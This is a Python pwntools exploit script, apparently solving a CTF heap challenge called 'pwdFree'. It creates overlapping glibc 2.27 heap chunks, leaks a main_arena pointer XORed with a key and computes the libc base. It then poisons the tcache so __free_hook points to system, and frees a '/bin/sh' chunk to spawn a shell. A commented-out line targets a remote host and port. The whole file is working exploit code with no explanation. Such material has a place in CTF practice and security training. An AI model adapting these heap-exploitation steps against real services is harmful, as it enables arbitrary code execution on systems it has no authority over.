from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

def add(id,size,content):
    p.sendlineafter("Input Your Choice:\n",str(1))
    p.sendafter("Save:",str(id))
    p.sendlineafter("Pwd:",str(size))
    p.sendafter("Pwd:",content)
def show(id):
    p.sendlineafter("Choice:\n",str(3))
    p.sendlineafter("Check:\n",str(id))
def delete(id):
    p.sendlineafter("Choice:\n",str(4))
    p.sendlineafter("Delete:\n",str(id))
def edit(id,data):
    p.sendlineafter("Choice:\n",str(2))
    p.sendline(str(id))
    p.sendline(str(data))

# p = process(["/glibc/2.27/amd64/lib/ld-2.27.so","./pwdFree"],env={'LD_PRELOAD':'/glibc/2.27/amd64/lib/libc-2.27.so'})
# p=process('./pwdFree',env={'LD_PRELOAD':'./libc.so.6'})
p=process('./pwdFree')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p=remote('47.104.71.220',38562)
# libc = ELF("libc.so.6")

add(0,0xf8,'\n')
p.recvuntil('D:')
leak=u64(p.recv(8))
rand=leak^0xa

for i in range(1,10):
    add(i,0xf8,'\n')
for i in range(3,10):
    delete(i)
delete(0)

for i in range(3,10):
    add(i+3,0xf8,'\n')
delete(1)
add(1,0xf8,'\x00'*0xf0+p64(0x200^rand))
for i in range(3,10-1):
    delete(i)
delete(0)
delete(2)   #chunk overlop

for i in range(3,10):
    add(i+3,0xf8,'\n')
add(8,0xf8,'\n')
show(1)

p.recvuntil('is: ')
leak=u64(p.recv(8))
main_arean_xx = leak^rand
print hex(main_arean_xx)
libc_base = main_arean_xx-(0x7ffff7dcdca0-0x7ffff79e2000)
print hex(libc_base)
free_hook = libc_base+libc.symbols['__free_hook']
print hex(free_hook)
system_addr = libc_base+libc.symbols['system']

add(9,0xf8,'\n')
delete(9)
edit(1,p64(free_hook)+'\n')
add(9,0xf8,p64(u64('/bin/sh\x00')^rand)+'\n')
add(10,0xf8,p64(system_addr^rand)+'\n')

# gdb.attach(p,"b *$rebase(0x18C6)")
# raw_input()
delete(9)

p.interactive()
